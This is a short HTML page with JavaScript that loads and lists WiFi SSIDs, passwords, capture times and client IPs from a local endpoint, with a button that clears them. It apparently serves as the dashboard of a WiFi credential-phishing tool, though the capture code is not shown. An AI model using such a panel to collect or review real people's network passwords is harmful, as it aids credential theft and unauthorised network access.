<!DOCTYPE html>
<html>
<head>
    <title>WiFi Passwords</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .btn { padding: 10px; margin: 5px; cursor: pointer; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h1>WiFi Passwords</h1>
    <button onclick="loadPasswords()" class="btn">Refresh</button>
    <button onclick="clearPasswords()" class="btn">Clear All</button>
    <a href="/index.html" class="btn">Back</a>
    
    <div id="message"></div>
    <table id="passwordTable">
        <tr>
            <th>SSID</th>
            <th>Password</th>
            <th>Time</th>
            <th>IP</th>
        </tr>
    </table>

    <script>
        function loadPasswords() {
            fetch('/wifi-passwords')
                .then(response => response.json())
                .then(data => {
                    const table = document.getElementById('passwordTable');
                    // Clear existing rows except header
                    while (table.rows.length > 1) {
                        table.deleteRow(1);
                    }
                    
                    if (data.length === 0) {
                        showMessage('No WiFi passwords found', 'error');
                        return;
                    }
                    
                    data.forEach(wifi => {
                        const row = table.insertRow();
                        row.insertCell(0).textContent = wifi.ssid || 'Unknown';
                        row.insertCell(1).textContent = wifi.password || 'Unknown';
                        row.insertCell(2).textContent = wifi.timestamp || 'Unknown';
                        row.insertCell(3).textContent = wifi.ip || 'Unknown';
                    });
                    
                    showMessage('Passwords loaded successfully', 'success');
                })
                .catch(error => {
                    showMessage('Error loading passwords', 'error');
                });
        }
        
        function clearPasswords() {
            if (confirm('Clear all WiFi passwords?')) {
                fetch('/clear-wifi-passwords', { method: 'POST' })
                    .then(response => response.text())
                    .then(() => {
                        showMessage('Passwords cleared', 'success');
                        loadPasswords();
                    })
                    .catch(error => {
                        showMessage('Error clearing passwords', 'error');
                    });
            }
        }
        
        function showMessage(msg, type) {
            document.getElementById('message').textContent = msg;
            document.getElementById('message').className = type;
        }
        
        // Load passwords when page loads
        loadPasswords();
    </script>
</body>
</html> 